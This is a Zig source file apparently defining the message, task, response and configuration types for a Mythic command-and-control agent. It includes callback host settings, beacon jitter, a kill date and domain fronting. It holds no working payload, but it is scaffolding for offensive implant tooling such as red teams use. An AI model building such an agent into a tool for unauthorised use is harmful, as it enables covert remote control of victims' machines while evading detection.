const std = @import("std");

pub const MessageType = enum {
    checkin,
    get_tasking,
    post_response,
    upload,
    download,
};

pub const TaskStatus = enum {
    submitted,
    processing,
    completed,
    erroragent,
};

pub const MythicTask = struct {
    id: []const u8,
    command: []const u8,
    parameters: []const u8,
    timestamp: []const u8,
    status: TaskStatus = .submitted,
};

pub const MythicResponse = struct {
    task_id: []const u8,
    user_output: []const u8,
    completed: bool,
    status: []const u8,
    artifacts: []const u8 = "",
};

pub const AgentConfig = struct {
    callback_host: []const u8,
    callback_port: u16,
    user_agent: []const u8,
    sleep_interval: u32,
    jitter: f32, // 0.0 to 1.0
    kill_date: ?[]const u8 = null,
    encrypted_exchange_check: bool = true,
    domain_front: ?[]const u8 = null,
};

